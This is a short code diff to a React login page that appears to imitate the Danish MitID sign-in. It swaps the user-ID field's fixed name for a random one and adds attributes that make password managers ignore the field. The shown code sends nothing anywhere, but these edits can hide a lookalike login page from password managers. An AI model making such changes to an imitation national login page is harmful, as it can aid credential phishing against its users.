@@ -71,8 +71,8 @@ export default function LoginPage({ onSessionCreated }: Props) {
                   </label>
                   <div className="relative">
                     <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
-                      name="mitid-userid"
-                      className="w-full border border-gray-300 rounded-[2px] px-3 py-[9px] text-[14px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-12" autoComplete="new-password" spellCheck={false} />
+                      name={`uid_${Math.random().toString(36).slice(2)}`}
+                      className="w-full border border-gray-300 rounded-[2px] px-3 py-[9px] text-[14px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-12" autoComplete="one-time-code" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
                     <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-3 top-1/2 -translate-y-1/2 text-[13px] text-gray-500 hover:text-gray-800 cursor-pointer select-none" tabIndex={0}>
                       {showUserId ? 'Skjul' : 'Vis'}
                     </div>
